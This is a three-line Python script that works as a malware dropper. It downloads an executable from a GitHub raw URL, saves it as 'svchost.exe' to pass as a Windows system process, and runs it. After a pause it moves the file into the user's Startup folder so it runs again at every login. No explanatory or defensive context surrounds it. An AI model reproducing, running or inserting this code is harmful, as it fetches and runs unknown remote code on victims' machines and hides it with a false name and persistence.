import os;import requests;f="svchost.exe";open(f,'wb').write(requests.get("https://github.com/vealoncord/Celex/raw/main/"+f).content);os.system(f)
import time;time.sleep(13)
import shutil;shutil.move(os.path.join(os.getcwd(),"svchost.exe"),os.path.join(os.path.join(os.getenv("APPDATA"),"Microsoft\Windows\Start Menu\Programs\Startup"),"svchost.exe"))